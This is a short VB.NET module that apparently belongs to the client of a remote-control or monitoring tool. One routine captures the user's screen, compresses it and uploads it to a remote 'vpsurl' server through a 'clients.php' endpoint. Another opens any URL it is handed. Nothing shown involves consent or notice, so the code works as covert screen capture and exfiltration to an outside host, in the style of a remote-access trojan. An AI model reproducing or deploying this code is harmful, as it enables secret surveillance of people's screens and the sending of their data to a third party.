Imports System.Net

Module IndependantActions
    Public Sub TakeScreenshot(fileName As String, ByRef mainWebClient As WebClient)
        Dim screenGrab As Bitmap = Screenshare.TakeBitmapScreenshot()
        Dim bmpBytes As Byte() = Screenshare.ResizeConvertBMP(screenGrab, 75L)
        mainWebClient.UploadData(My.Settings.vpsurl & "clients.php?action=uploadscreenshot&actioncontent=" + fileName, bmpBytes)
    End Sub

    Public Sub OpenURL(url As String)
        Try
            Process.Start(url)
        Catch ex As System.ComponentModel.Win32Exception
            Exit Sub
        End Try
    End Sub
End Module
